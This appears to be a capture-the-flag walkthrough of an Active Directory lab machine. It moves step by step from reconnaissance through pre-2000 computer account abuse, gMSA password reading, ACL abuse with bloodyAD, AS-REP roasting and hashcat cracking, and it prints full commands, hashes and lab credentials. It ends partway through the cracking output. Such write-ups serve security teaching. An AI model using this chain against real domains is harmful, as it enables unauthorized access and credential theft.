![image](https://github.com/user-attachments/assets/8c941618-e932-40c8-9a6d-ebe580342013)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 16:29 +08
Nmap scan report for 10.10.11.45
Host is up (0.0056s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-29 08:15:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -14m58s
| smb2-time:
|   date: 2024-12-29T08:15:18
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT     ADDRESS
1   5.78 ms 10.10.14.1
2   6.18 ms 10.10.11.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.98 seconds
```

The target machine appears to be a domain controller, but the DC name was not in the nmap results; some quick guess revealed the name:

```console
root@kali:~# nslookup dc.vintage.htb 10.10.11.45
Server:         10.10.11.45
Address:        10.10.11.45#53

** server can't find dc.vintage.htb: NXDOMAIN


root@kali:~# nslookup dc01.vintage.htb 10.10.11.45
Server:         10.10.11.45
Address:        10.10.11.45#53

Name:   dc01.vintage.htb
Address: 10.10.11.45
```

Let's add the hosts records to Kali:

```sh
cat << EOF >> /etc/hosts
10.10.11.45 vintage.htb
10.10.11.45 dc01.vintage.htb
EOF
```

## 2. Exploring Active Directory

> **Machine information given:**
>
> As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account:
>
> `P.Rosa` / `Rosaisbest123`

### 2.1. Initial  unsuccessful enumeration

```console
root@kali:~# crackmapexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -d vintage.htb
SMB         dc01.vintage.htb 445    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01.vintage.htb [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED

root@kali:~# evil-winrm -u P.Rosa -p Rosaisbest123 -i dc01.vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type ArgumentError happened, message is unknown type: 2061232681

Error: Exiting with code 1
```

### 2.2. Attempting Kerberos

Attempting to get TGT resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:

```console
root@kali:~# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Let's sync the time on Kali with the target

Install `ntpdate`: `apt -y install ntpdate`

Turns out the time on Kali was 898 seconds ahead of the target

```console
root@kali:~# ntpdate -q dc01.vintage.htb
2024-12-29 16:33:43.529641 (+0800) -898.809068 +/- 0.002711 dc01.vintage.htb s1 no-leap
```

Disable NTP on Kali and sync the time with the target

```console
root@kali:~# timedatectl set-ntp 0

root@kali:~# ntpdate dc01.vintage.htb
2024-12-29 16:34:22.730475 (+0800) -898.822663 +/- 0.002488 dc01.vintage.htb s1 no-leap
CLOCK: time stepped by -898.822663

root@kali:~# ntpdate -q dc01.vintage.htb
2024-12-29 16:34:40.387062 (+0800) +0.369112 +/- 0.372150 dc01.vintage.htb s1 no-leap
```

`getTGT` works after the time sync

```console
root@kali:~# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in P.Rosa.ccache

root@kali:~# export KRB5CCNAME=P.Rosa.ccache
```

The KDC for `vintage.htb` could not be located:

```console
root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Cannot find KDC for realm "VINTAGE.HTB"


Error: Exiting with code 1
```

Create `/etc/krb5.conf` to point to `dc01.vintage.htb` as KDC

```sh
cat << EOF > /etc/krb5.conf
[libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }
[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
EOF
```

Seems like still cannot connect via WinRM, slightly different error now:

```console
root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success


Error: Exiting with code 1
malloc(): unaligned fastbin chunk detected
Aborted
```

### 2.3. Active Directory discovery

#### 2.3.1. Getting some information

Get shares

```console
root@kali:~# crackmapexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -d vintage.htb --use-kcache --shares
SMB         dc01.vintage.htb 445    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01.vintage.htb [+] vintage.htb\ from ccache
SMB         dc01.vintage.htb 445    dc01.vintage.htb [+] Enumerated shares
SMB         dc01.vintage.htb 445    dc01.vintage.htb Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01.vintage.htb -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01.vintage.htb ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01.vintage.htb C$                              Default share
SMB         dc01.vintage.htb 445    dc01.vintage.htb IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01.vintage.htb NETLOGON        READ            Logon server share
SMB         dc01.vintage.htb 445    dc01.vintage.htb SYSVOL          READ            Logon server share
```

Get users

```console
root@kali:~# netexec ldap dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --users
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\P.Rosa from ccache
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*] Enumerated 14 domain users: vintage.htb
LDAP        dc01.vintage.htb 389    dc01.vintage.htb -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Guest                         2024-11-13 14:16:53 1       Built-in account for guest access to the computer/domain
LDAP        dc01.vintage.htb 389    dc01.vintage.htb krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account
LDAP        dc01.vintage.htb 389    dc01.vintage.htb M.Rossi                       2024-06-05 13:31:08 1
LDAP        dc01.vintage.htb 389    dc01.vintage.htb R.Verdi                       2024-06-05 13:31:08 1
LDAP        dc01.vintage.htb 389    dc01.vintage.htb L.Bianchi                     2024-06-05 13:31:08 1
LDAP        dc01.vintage.htb 389    dc01.vintage.htb G.Viola                       2024-06-05 13:31:08 1
LDAP        dc01.vintage.htb 389    dc01.vintage.htb C.Neri                        2024-06-05 21:08:13 0
LDAP        dc01.vintage.htb 389    dc01.vintage.htb P.Rosa                        2024-11-06 12:27:16 0
LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_sql                       2024-12-30 01:52:04 0
LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_ldap                      2024-06-06 13:45:27 0
LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_ark                       2024-06-06 13:45:27 1
LDAP        dc01.vintage.htb 389    dc01.vintage.htb C.Neri_adm                    2024-06-07 10:54:14 0
LDAP        dc01.vintage.htb 389    dc01.vintage.htb L.Bianchi_adm                 2024-11-26 11:40:30 1
```

Get RIDs

```console
root@kali:~# netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa from ccache
SMB         dc01.vintage.htb 445    dc01             498: VINTAGE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             500: VINTAGE\Administrator (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             501: VINTAGE\Guest (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             502: VINTAGE\krbtgt (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             512: VINTAGE\Domain Admins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             513: VINTAGE\Domain Users (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             514: VINTAGE\Domain Guests (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             515: VINTAGE\Domain Computers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             516: VINTAGE\Domain Controllers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             517: VINTAGE\Cert Publishers (SidTypeAlias)
SMB         dc01.vintage.htb 445    dc01             518: VINTAGE\Schema Admins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             519: VINTAGE\Enterprise Admins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             520: VINTAGE\Group Policy Creator Owners (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             521: VINTAGE\Read-only Domain Controllers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             522: VINTAGE\Cloneable Domain Controllers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             525: VINTAGE\Protected Users (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             526: VINTAGE\Key Admins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             527: VINTAGE\Enterprise Key Admins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             553: VINTAGE\RAS and IAS Servers (SidTypeAlias)
SMB         dc01.vintage.htb 445    dc01             571: VINTAGE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         dc01.vintage.htb 445    dc01             572: VINTAGE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         dc01.vintage.htb 445    dc01             1002: VINTAGE\DC01$ (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1103: VINTAGE\DnsAdmins (SidTypeAlias)
SMB         dc01.vintage.htb 445    dc01             1104: VINTAGE\DnsUpdateProxy (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1107: VINTAGE\gMSA01$ (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1108: VINTAGE\FS01$ (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1111: VINTAGE\M.Rossi (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1112: VINTAGE\R.Verdi (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1113: VINTAGE\L.Bianchi (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1114: VINTAGE\G.Viola (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1115: VINTAGE\C.Neri (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1116: VINTAGE\P.Rosa (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1120: VINTAGE\IT (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1121: VINTAGE\HR (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1122: VINTAGE\Finance (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1123: VINTAGE\ServiceAccounts (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1131: VINTAGE\DelegatedAdmins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1134: VINTAGE\svc_sql (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1135: VINTAGE\svc_ldap (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1136: VINTAGE\svc_ark (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1137: VINTAGE\ServiceManagers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1140: VINTAGE\C.Neri_adm (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1141: VINTAGE\L.Bianchi_adm (SidTypeUser)
```

#### 2.3.2. BloodHound

Generating bloodhound packages

```console
root@kali:~# bloodhound-python -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 -c all --dns-tcp --zip
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The DNS query name does not exist: FS01.vintage.htb.
INFO: Done in 00M 01S
INFO: Compressing output into 20241231093547_bloodhound.zip
```

Find all Domain Admins: `L.Bianchi_adm` found to be a member

![image](https://github.com/user-attachments/assets/509d5d3a-7072-41ff-a59c-b42ce751cb0d)

Shortest Paths to Uncontrainted Delegation Systems:

![image](https://github.com/user-attachments/assets/a164019e-1f0c-4b6a-b053-57a82a38bfd4)

## 3. Lateral movement

### 3.1. Moving to `FS01.vintage.htb`

`FS01.vintage.htb` is mentioned in the BloodHound query, which seems to be a domain computer, but not recorded in the domain DNS

A quick check in BloodHound shows that `FS01` is a member of `PRE-WINDOWS 2000 COMPATIBLE ACCESS` group, which is a _vintage_ method of having [pre-created computer accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)

![image](https://github.com/user-attachments/assets/96d0342b-f145-453b-9ef8-ec7fb864af39)

Searching for pre2k quickly leads to a useful [python script](https://github.com/garrettfoster13/pre2k-TS)

Prepare the user name list:

```console
root@kali:~# netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.lst
Administrator
Guest
krbtgt
DC01$
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
python3 pre2k.py unauth -d vintage.htb -dc-ip dc01.vintage.htb -save -inputfile users.lst
```

Running pre2k checks each account in the list for pre 2000 membership, and the `-save` option conveniently gets and saves TGT for the account

```console
root@kali:~# python3 pre2k.py unauth -d vintage.htb -dc-ip dc01.vintage.htb -save -inputfile users.lst
/root/pre2k.py:23: SyntaxWarning: invalid escape sequence '\ '
  show_banner = '''

                                ___    __                __
                              /'___`\ /\ \              /\ \__
 _____   _ __    __          /\_\ /\ \\ \ \/'\          \ \ ,_\   ____
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    _______\ \ \/  /',__\
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\ /\______\\ \ \_/\__, `\
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\/______/ \ \__\/\____/
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/          \/__/\/___/
   \ \_\
    \/_/                                        @garrfoster

Reading from users.lst...
Testing started at 2025-01-01 12:36:38.630825
Saving ticket in FS01$.ccache
[+] VALID CREDENTIALS: vintage.htb\FS01$:fs01
```

### 3.2. Moving to `GMSA01$`

Checking the `Group Delegated Object Control` under `Node Info` for `FS01`:
- `FS01` is a member of `Domain Computers` group
- `Domain Computers` group has `ReadGMSAPassword` rights to the `GMSA01$` GMSA account

![image](https://github.com/user-attachments/assets/15393e57-9a89-4654-bc56-778b1d33c7e0)

GMSA was supposedly a way to secure service account passwords, it may ironically be the way in for this case

![image](https://github.com/user-attachments/assets/98841e3f-b19b-4209-b01b-8468efbe7ba5)

Let's use the `ReadGMSAPassword` permission to get the password hash for `GMSA01$`

> [!Tip]
>
> bloodyAD is used to perform specific LDAP calls to a domain controller for AD privesc
> 
> It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc
>
> Install bloodyAD in Kali with `apt -y install bloodyAD`

```console
root@kali:~# export KRB5CCNAME='FS01$.ccache'

root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb -k --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:FS01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
```

### 3.3. Moving to `ServiceManagers`

Checking the `First Degree Object Control` under `Node Info` for `GMSA01$`:
- `GMSA01$` has `AddSelf` and `GenericWrite` rights to `ServiceManagers`

![image](https://github.com/user-attachments/assets/ff8f1cc9-8e7e-4d33-927c-a997fe3c0cf2)

AddSelf:

![image](https://github.com/user-attachments/assets/cd76ac26-3241-47e8-9f8b-ea2391b70929)

GenericWrite:

![image](https://github.com/user-attachments/assets/49149ccc-d3c3-4cd8-8aa9-4f0992729b3f)

Get a TGT for `GMSA01$` using the password hash retrieved:

```console
root@kali:~# impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in GMSA01$.ccache

root@kali:~# export KRB5CCNAME='GMSA01$.ccache'
```

Adding `GMSA01$` self to `ServiceManagers`:

```console
root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember ServiceManagers 'GMSA01$'
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful
[+] GMSA01$ added to ServiceManagers
```

Verify membership:

```console
root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k get object CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb --attr member
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful

distinguishedName: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
member: CN=C.Neri,CN=Users,DC=vintage,DC=htb; CN=G.Viola,CN=Users,DC=vintage,DC=htb; CN=L.Bianchi,CN=Users,DC=vintage,DC=htb; CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
```

### 3.4. Moving to `svc_` accounts

Lastly, `ServiceManagers` has `GenericAll` rights to its 3 members: `svc_ark`, `svc_ldap` and `svc_sql`

![image](https://github.com/user-attachments/assets/2b5e517c-027e-4063-aa42-be454c28c9cc)

Let's set `DONT_REQ_PREAUTH` on these accounts to try and get their password hashes:

```consoleroot@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ark -f DONT_REQ_PREAUTH
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ark's userAccountControl

root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ldap -f DONT_REQ_PREAUTH
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ldap's userAccountControl

root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_sql -f DONT_REQ_PREAUTH
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_sql's userAccountControl
```

Run `GetNPUsers` to get the password hashes:

```console
root@kali:~# cat << EOF > svc.lst
svc_ark
svc_ldap
svc_sql
EOF

root@kali:~# impacket-GetNPUsers vintage.htb/ -no-pass -dc-ip 10.10.11.45 -request -usersfile svc.lst
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$svc_ark@VINTAGE.HTB:c8650cb31c465483ccfe43029939d363$9e1096eb662f27c9182342d1ad430f9ff42e056acaf72cd7a52bd8dcbea1b29d7c461d6c86cb4d3d58cdbd079a61a0bfa226ccad84a80ef565d8d5c3a5d0e822c6938693083f533bc93d1fb6880d12a72a4ababaa9c95371a3e17655116b07dad794b4317894dda00bed3ee5e6274b9c2ff5b6b1b56ff3f067e4a49a67450483485042a7211c721152825e1027e83feace26f66c375ff4327360c609e36957736fe703f153a67883cf6db3fa39ae466a257658f3a619722dd276de8e6e816c799261c5e34d1375aca8e0734ba2832afd0885e1d5cd87a7727edd928cc80aa62c9cb7680a229386353252
$krb5asrep$23$svc_ldap@VINTAGE.HTB:fa1e8d177ca3b0234cf7561f9e85229f$51634fbe530bf13b3640319504e620c7263e3d442a6bf4f0f038bedea51491545d479edceded2c76aa5952b89ea5523abe138969e35d48ab1750647f9c9d57568c838c040f6b8ad89d289e1c03ed5ad4434406c66a044d6518567f58723aea3ef053a6299531f9e42e3ac324d426bdc77166eeda364a8ab23e067412bda6fab81b68115ddc0af76d59acf8edbd08798e810274d6ee6066896fadc321a34d7d181c6af4b7bacd078f2a508fecb22594dac89e5c78a88de1f1317ae4d58d133d78a2dc62711a8a0c49486c9260dd47d1cc1220cbaa8d297dbca466a055c35a8382686c3701f27c73b07b6c
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

`KDC_ERR_CLIENT_REVOKED` encountered for `svc_sql`, it's likely that the account is disabled, let's enable it with `bloodyAD`:

```console
root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
[*] Trying to connect to dc01.vintage.htb...
[+] Connection successful
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
```

Run `GetNPUsers` again to get the password hashes and save it to `hashes.txt`

```console
root@kali:~# impacket-GetNPUsers vintage.htb/ -no-pass -dc-ip 10.10.11.45 -request -usersfile svc.lst | grep krb5asrep | tee hashes.txt
$krb5asrep$23$svc_ark@VINTAGE.HTB:90394f4f4515085e673e7460d121a059$5d25e1fc7a4a4e86f7d7876dee3d28e88ba75f401d2810e8b1df67857e746c6f777949e7eaed143ec2ad69ef4e739b95e57f651d3713063380a3c7964a9d0eb5e667cdfdac06b7697d633c4df470e96a646f9a5bf99aeb05e4f8800319fd2936ea9284101ef816090797ab54d233b66e0c274d37ffcad397c286fca498277392ff256881c092e9b2626ead9da49998803097df8a9c9900b6994e289a094ab67dc7eed4583c717cf7c3e890b91e8ad2e23182c0b2ad801b9e9c76e6dd266c5685f208e2439e782d181ff8523918299f9c061174f783af77d87d1c1d6d29350105a59d1c1c3d3a72013c8b
$krb5asrep$23$svc_ldap@VINTAGE.HTB:576dc870c88a60aae0d2a40e16e0656d$b590962824be0d5eb3910ec2fde6f7ea320a680b902ca3f3fcc68838c61a2204d99c52b0330819cec0ce9adcbc5db3de946789f21f6fcedcf48e9d93345fbdcae17f2fd0667521b98705e5ed3893ebd5a020c29aaf7ff160f0063d18b3ab4a2af1275052743c9cec5c3dae26b36ee8436f0b71e6c5f1850f4eb533e81bd4d06de2531308f625c2a756945e0f63ea5e6d80759bb30d437f78a2b9a36823ed4cf4b313b6e0d90ec8457b18c520084ba46731658074d32b4cab6abd7186c87946c3c900ad9684f51a4e9b3656ee0f50557c64a5c98a619e3378fec4961ec19d25e782bd5e72439fe9d06a65
$krb5asrep$23$svc_sql@VINTAGE.HTB:7f721c7fd76af48f34c25897190d620c$124639b5b33120728f6429d945a9f221ec0bc18ab3655c2b04d784908ba6780a32cac3ea4315e306a3c00679e6337600b4d7fb4bf09f5014a26c48938f0a049bbc37759a761b3469b5b56d0ab4411d807bbd8d554934fcb92dd812fe0ba93162015de5d95ebc62d6287d9004c512d53ddb942b7909923e3237758f44de9d425af6651ddda73a9a68b325c8b4c05a41a1acb916db658c97b4261c0d3124d75d890ab02a6e71a6721bb58ddf099e150d880ee3423fd096c9e1d7babb5a9c41129e32af5c09bc658d0cfbc487f81f763e0f4dcf33172f7c5a2ebbd7d1d19cf28b58c8a16180482539c207ea
```

Crack the password hash with `hashcat` → password `` found:

```console
root@kali:~# hashcat hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
⋮

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
⋮

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc_sql@VINTAGE.HTB:7f721c7fd76af48f34c25897190d620c$124639b5b33120728f6429d945a9f221ec0bc18ab3655c2b04d784908ba6780a32cac3ea4315e306a3c00679e6337600b4d7fb4bf09f5014a26c48938f0a049bbc37759a761b3469b5b56d0ab4411d807bbd8d554934fcb92dd812fe0ba93162015de5d95ebc62d6287d9004c512d53ddb942b7909923e3237758f44de9d425af6651ddda73a9a68b325c8b4c05a41a1acb916db658c97b4261c0d3124d75d890ab02a6e71a6721bb58ddf099e150d880ee3423fd096c9e1d7babb5a9c41129e32af5c09bc658d0cfbc487f81f763e0f4dcf33172f7c5a2ebbd7d1d19cf28b58c8a16180482539c207ea:Zer0the0ne
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: hashes.txt
Time.Started.....: Wed Jan  1 13:36:54 2025 (7 secs)
Time.Estimated...: Wed Jan  1 13:37:01 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3936.1 kH/s (0.77ms) @ Accel:512 Loops:1 Thr:1 Vec:8
